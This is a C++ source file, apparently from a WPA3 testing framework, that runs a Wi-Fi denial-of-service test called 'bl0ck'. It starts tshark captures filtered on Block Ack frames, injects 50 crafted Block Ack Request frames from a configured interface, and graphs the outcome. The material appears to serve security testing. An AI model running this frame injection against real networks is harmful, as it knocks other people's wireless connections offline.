#include "attacks/DoS_soft/bl0ck/bl0ck.h"
#include "attacks/DoS_soft/bl0ck/test_monitor_bl0ck/test_sae_commit_monitor.h"
#include "config/RunStatus.h"
#include <chrono>
#include <thread>

#include "observer/tshark_wrapper.h"
#include "system/hw_capabilities.h"

namespace wpa3_tester::test_monitor_bl0ck{
    using namespace std;
    using namespace filesystem;
    using namespace Tins;
    using namespace chrono;

    void speed_observation_start(RunStatus &rs){
        const HWAddress<6> rx_mac(rs.get_actor("receiver")["mac"]);
        const HWAddress<6> tx_mac(rs.get_actor("transceiver")["mac"]);

        const string mac_filter =
        "(wlan host "+rx_mac.to_string()+" or wlan host "+tx_mac.to_string()+")"
       " or (wlan[0] & 0xfc == 0x84 or wlan[0] & 0xfc == 0x94)";

        observer::start_tshark(rs, "receiver", mac_filter);
        observer::start_tshark(rs, "transceiver", mac_filter);
    }

    void run_attack(RunStatus& rs){
        const NetworkInterface iface_obj(rs.get_actor("transceiver")["iface"]);

        const HWAddress<6> rx_mac(rs.get_actor("receiver")["mac"]);
        const HWAddress<6> tx_mac(rs.get_actor("transceiver")["mac"]);
        speed_observation_start(rs);

        PacketSender sender;
        this_thread::sleep_for(seconds(5));
        RadioTap block_frame = bl0ck_attack::get_BAR_frame(rx_mac,tx_mac);
        for (int i = 0; i < 50; ++i) {sender.send(block_frame, iface_obj);}
        this_thread::sleep_for(seconds(5));

    }

    void stats_attack(const RunStatus& rs){
        vector<observer::graph_lines> events;
        observer::tshark_graph(rs, "receiver", events);
    }
}
